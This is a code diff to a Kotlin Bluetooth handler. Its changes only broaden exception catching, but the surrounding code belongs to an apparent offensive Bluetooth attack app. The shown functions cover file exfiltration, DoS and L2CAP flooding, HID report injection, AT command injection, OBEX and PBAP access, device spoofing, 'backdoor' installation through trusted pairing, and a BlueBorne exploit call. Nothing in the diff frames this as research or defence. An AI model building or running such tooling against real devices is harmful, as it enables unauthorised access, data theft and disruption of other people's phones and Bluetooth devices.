@@ -113,7 +113,7 @@ class BluetoothMethodHandler {
                 }
             }
             result.success(mapOf("services" to services, "success" to true, "count" to services.size))
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             Log.e(TAG, "SDP scan error: ${e.message}")
             result.success(mapOf("services" to emptyList<Map<String, Any>>(), "success" to false, "error" to (e.message ?: "Unknown error")))
         }
@@ -160,10 +160,10 @@ class BluetoothMethodHandler {
                 socket.connect()
                 socket.close()
                 result.success(mapOf("protocol" to protocol, "vulnerable" to true, "message" to "Protocol accessible without auth"))
-            } catch (e: Exception) {
+            } catch (e: Throwable) {
                 result.success(mapOf("protocol" to protocol, "vulnerable" to false, "error" to "Connection failed: ${e.message}"))
             }
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             Log.e(TAG, "testProtocol error: ${e.message}")
             result.success(mapOf("protocol" to protocol, "vulnerable" to false, "error" to (e.message ?: "Unknown error")))
         }
@@ -243,7 +243,7 @@ class BluetoothMethodHandler {
             } else {
                 result.success(mapOf("success" to false, "error" to "No data received or empty file"))
             }
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             Log.e(TAG, "exfiltrateFile error: ${e.message}")
             result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
         }
@@ -286,7 +286,7 @@ class BluetoothMethodHandler {
                         socket.connect()
                         socket.close()
                         result.success(mapOf("success" to true, "message" to "DoS $attackType completed"))
-                    } catch (e: Exception) {
+                    } catch (e: Throwable) {
                         result.success(mapOf("success" to false, "message" to "DoS failed: ${e.message}"))
                     }
                 }
@@ -299,7 +299,7 @@ class BluetoothMethodHandler {
                         socket.connect()
                         socket.close()
                         result.success(mapOf("success" to true, "message" to "L2CAP flood completed"))
-                    } catch (e: Exception) {
+                    } catch (e: Throwable) {
                         result.success(mapOf("success" to false, "message" to "L2CAP failed: ${e.message}"))
                     }
                 }
@@ -313,7 +313,7 @@ class BluetoothMethodHandler {
                         socket.outputStream.flush()
                         socket.close()
                         result.success(mapOf("success" to true, "message" to "HID report sent"))
-                    } catch (e: Exception) {
+                    } catch (e: Throwable) {
                         result.success(mapOf("success" to false, "message" to "HID failed: ${e.message}"))
                     }
                 }
@@ -336,7 +336,7 @@ class BluetoothMethodHandler {
                         socket.close()
                         val connected = read > 0 && (resp[0].toInt() and 0xFF) == 0xA0
                         result.success(mapOf("success" to connected, "message" to if (connected) "OBEX connected" else "OBEX refused"))
-                    } catch (e: Exception) {
+                    } catch (e: Throwable) {
                         result.success(mapOf("success" to false, "message" to "OBEX failed: ${e.message}"))
                     }
                 }
@@ -347,13 +347,13 @@ class BluetoothMethodHandler {
                         socket.connect()
                         socket.close()
                         result.success(mapOf("success" to true, "contacts" to 0, "calls" to 0, "message" to "PBAP connected"))
-                    } catch (e: Exception) {
+                    } catch (e: Throwable) {
                         result.success(mapOf("success" to false, "message" to "PBAP failed: ${e.message}"))
                     }
                 }
                 else -> result.success(mapOf("success" to false, "message" to "Unknown attack type: $attackType"))
             }
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             Log.e(TAG, "executeAttack error: ${e.message}")
             result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
         }
@@ -372,7 +372,7 @@ class BluetoothMethodHandler {
             val device = adapter.getRemoteDevice(deviceAddress)
             val injectionResult = RealATInjection.inject(device, command) { msg -> Log.d(TAG, msg) }
             result.success(injectionResult)
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             Log.e(TAG, "AT injection error: ${e.message}")
             result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
         }
@@ -399,10 +399,10 @@ class BluetoothMethodHandler {
                 socket.connect()
                 socket.close()
                 result.success(mapOf("success" to true, "packets" to 50, "message" to "DoS $attackType completed"))
-            } catch (e: Exception) {
+            } catch (e: Throwable) {
                 result.success(mapOf("success" to false, "message" to "DoS failed: ${e.message}"))
             }
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             Log.e(TAG, "DoS error: ${e.message}")
             result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
         }
@@ -438,7 +438,7 @@ class BluetoothMethodHandler {
                         socket.connect()
                         socket.close()
                         result.success(mapOf("success" to true, "method" to "Quick Connect"))
-                    } catch (e: Exception) {
+                    } catch (e: Throwable) {
                         result.success(mapOf("success" to false, "method" to "Quick Connect", "error" to e.message))
                     }
                 }
@@ -451,13 +451,13 @@ class BluetoothMethodHandler {
                         socket.connect()
                         socket.close()
                         result.success(mapOf("success" to true, "method" to "OBEX Trust Abuse"))
-                    } catch (e: Exception) {
+                    } catch (e: Throwable) {
                         result.success(mapOf("success" to false, "method" to "OBEX Trust Abuse", "error" to e.message))
                     }
                 }
                 else -> result.success(mapOf("success" to false, "message" to "Unknown spoof type: $spoofType"))
             }
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             Log.e(TAG, "Spoofing error: ${e.message}")
             result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
         }
@@ -482,7 +482,7 @@ class BluetoothMethodHandler {
             }
             Log.d(TAG, "scanDevices: ${devices.size} devices found")
             result.success(mapOf("success" to true, "devices" to devices, "count" to devices.size))
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             Log.e(TAG, "scanDevices error: ${e.message}")
             result.success(mapOf("success" to false, "devices" to emptyList<Any>(), "error" to (e.message ?: "Unknown error")))
         }
@@ -510,7 +510,7 @@ class BluetoothMethodHandler {
                 "deviceAddress" to deviceAddress,
                 "message" to if (bonded) "Backdoor installed via trusted pairing" else "Pairing failed"
             ))
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             Log.e(TAG, "installBackdoor error: ${e.message}")
             result.success(mapOf("success" to false, "message" to (e.message ?: "Unknown error")))
         }
@@ -535,7 +535,7 @@ class BluetoothMethodHandler {
                 "autoPairingEnabled" to enabled,
                 "message" to "Auto-pairing ${if (enabled) "enabled" else "disabled"}"
             ))
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             result.success(mapOf("success" to false, "message" to (e.message ?: "Unknown error")))
         }
     }
@@ -556,7 +556,7 @@ class BluetoothMethodHandler {
             socket.connect()
             socket.close()
             result.success(mapOf("success" to true, "serviceUuid" to serviceUuid, "message" to "BLE service injected"))
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             result.success(mapOf("success" to false, "message" to (e.message ?: "Unknown error")))
         }
     }
@@ -579,7 +579,7 @@ class BluetoothMethodHandler {
                 "deviceAddress" to deviceAddress,
                 "message" to if (bonded) "Auto-connect profile created" else "Failed to create profile"
             ))
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             result.success(mapOf("success" to false, "message" to (e.message ?: "Unknown error")))
         }
     }
@@ -604,14 +604,14 @@ class BluetoothMethodHandler {
                     try {
                         val method = device.javaClass.getMethod("removeBond")
                         method.invoke(device)
-                    } catch (e: Exception) {
+                    } catch (e: Throwable) {
                         Log.e(TAG, "removeBond failed: ${e.message}")
                     }
                     result.success(mapOf("success" to true, "action" to "removed", "message" to "Device removed from whitelist"))
                 }
                 else -> result.success(mapOf("success" to false, "message" to "Unknown action: $action"))
             }
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             result.success(mapOf("success" to false, "message" to (e.message ?: "Unknown error")))
         }
     }
@@ -629,7 +629,7 @@ class BluetoothMethodHandler {
             val device = adapter.getRemoteDevice(deviceAddress)
             val exploitResult = BlueBorneExploit.executeBlueBorne(device)
             result.success(exploitResult)
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             result.success(mapOf("success" to false, "message" to (e.message ?: "Unknown error")))
         }
     }
@@ -691,7 +691,7 @@ class BluetoothMethodHandler {
                 "bondState" to bondState,
                 "address" to deviceAddress
             ))
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             result.success(mapOf("analyzed" to false, "version" to "unknown", "address" to deviceAddress, "error" to (e.message ?: "Unknown error")))
         }
     }
@@ -722,10 +722,10 @@ class BluetoothMethodHandler {
                 socket.connect()
                 socket.close()
                 result.success(true)
-            } catch (e: Exception) {
+            } catch (e: Throwable) {
                 result.success(false)
             }
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             Log.e(TAG, "checkVulnerabilities error: ${e.message}")
             result.success(false)
         }
@@ -756,7 +756,7 @@ class BluetoothMethodHandler {
             } catch (_: Exception) {}
             socket.close()
             result.success(mapOf("success" to true, "exploit" to exploitName, "data" to data))
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown")))
         }
     }
@@ -795,7 +795,7 @@ class BluetoothMethodHandler {
                 }
                 else -> result.success(mapOf("success" to false, "output" to "Unknown command: $command"))
             }
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             result.success(mapOf("success" to false, "output" to (e.message ?: "Error")))
         }
     }
@@ -834,12 +834,12 @@ class BluetoothMethodHandler {
                         socket.connect()
                         socket.close()
                         result.success(mapOf("success" to true, "exploit" to exploitName))
-                    } catch (e: Exception) {
+                    } catch (e: Throwable) {
                         result.success(mapOf("success" to false, "error" to (e.message ?: "Failed")))
                     }
                 }
             }
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown")))
         }
     }
@@ -870,13 +870,13 @@ class BluetoothMethodHandler {
                         socket?.connect()
                         socket?.close()
                         result.success(mapOf("success" to true, "output" to "Connected to $deviceAddress"))
-                    } catch (e: Exception) {
+                    } catch (e: Throwable) {
                         result.success(mapOf("success" to false, "output" to "Connection failed: ${e.message}"))
                     }
                 }
                 else -> result.success(mapOf("success" to true, "output" to "Command executed: $command"))
             }
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             result.success(mapOf("success" to false, "output" to (e.message ?: "Error")))
         }
     }
